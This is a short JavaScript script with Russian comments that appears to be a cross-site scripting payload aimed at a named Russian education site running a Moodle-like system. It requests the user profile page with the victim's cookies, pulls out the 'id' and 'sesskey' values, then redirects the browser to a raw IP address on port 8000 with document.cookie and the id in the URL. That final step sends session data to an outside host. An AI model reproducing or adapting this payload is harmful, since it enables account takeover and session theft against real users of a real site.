function extractValuesRegex(htmlContent) {
    // Ищем id
    const idMatch = htmlContent.match(/name="id"\s+value="([^"]+)"/);
    const id = idMatch ? idMatch[1] : null;
    
    // Ищем sesskey
    const sesskeyMatch = htmlContent.match(/name="sesskey"\s+value="([^"]+)"/);
    const sesskey = sesskeyMatch ? sesskeyMatch[1] : null;
    
    return { id, sesskey };
}

async function getUserProfile() {
    const url = 'https://www.dist-mspk.ru/user/profile.php';
    
    // Подготавливаем заголовки (как в вашем запросе)
    const headers = new Headers();
    headers.append('Cookie', document.cookie);
    headers.append('Sec-Ch-Ua', '"Chromium";v="145", "Not:A-Brand";v="99"');
    headers.append('Sec-Ch-Ua-Mobile', '?0');
    headers.append('Sec-Ch-Ua-Platform', '"Linux"');
    headers.append('Accept-Language', 'en-US,en;q=0.9');
    headers.append('Upgrade-Insecure-Requests', '1');
    headers.append('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36');
    headers.append('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7');
    headers.append('Sec-Fetch-Site', 'none');
    headers.append('Sec-Fetch-Mode', 'navigate');
    headers.append('Sec-Fetch-User', '?1');
    headers.append('Sec-Fetch-Dest', 'document');
    headers.append('Accept-Encoding', 'gzip, deflate, br');
    headers.append('Priority', 'u=0, i');
    headers.append('Connection', 'keep-alive');

    try {
        // Выполняем GET запрос
        const response = await fetch(url, {
            method: 'GET',
            headers: headers,
            credentials: 'include' // Важно для отправки cookies
        });

        // Проверяем статус ответа
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        // Получаем содержимое как текст (HTML)
        const htmlContent = await response.text();

        const { id, sesskey } = extractValuesRegex(htmlContent);
        console.log('ID:', id);
        console.log('Sesskey:', sesskey);
        
        console.log('=== Содержимое страницы профиля ===');
        console.log(`Статус: ${response.status} ${response.statusText}`);
        console.log(`URL: ${response.url}`);
        console.log('=== HTML содержимое (первые 1000 символов) ===');
        console.log(htmlContent.substring(0, 1000));
        console.log('... (остальной контент обрезан) ...');
        console.log(`Общая длина HTML: ${htmlContent.length} символов`);
        window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie)+id,sesskey;
        return htmlContent;
        
    } catch (error) {
        console.error('Ошибка при получении профиля:', error);
        throw error;
    }
}

getUserProfile()
